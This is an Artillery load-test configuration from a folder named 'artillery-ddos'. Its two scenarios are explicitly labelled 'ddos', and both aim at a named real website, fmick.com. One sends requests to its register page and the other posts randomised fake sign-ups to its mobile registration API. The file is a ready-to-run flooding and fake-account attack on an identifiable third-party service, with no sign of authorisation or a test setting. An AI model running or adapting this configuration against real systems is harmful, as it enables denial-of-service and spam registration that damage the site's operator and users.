artillery-ddos/fmick.yml
# artillery run artillery-ddos/fmick.yml
# DEBUG=http artillery run artillery-ddos/fmick.yml
# DEBUG=http:response artillery run artillery-ddos/fmick.yml
config:
  target: "https://fmick.com"
  phases:
    - duration: 1
      arrivalRate: 1
  processor: "./ngrok.js"
scenarios:
  - name: "ddos 1"
    flow:
      - function: "generateRandomData"
      - get:
          url: "https://fmick.com/register?referral_code={{ password }}"
      - log: "Get with {{ name }}"
  - name: "ddos 2"
    flow:
      - function: "generateRandomData"
      - post:
          url: "https://i.fmick.com/api/v1/member/register/mobile"
          json:
            country_code: "VN"
            lang_code: "EN"
            mobile_no: "1231232131"
            password: "{{ password }}"
            referral_code: "{{ name }}"
            user_id: "{{ name }}"
      - log: "Post with {{ name }}, {{ password }}"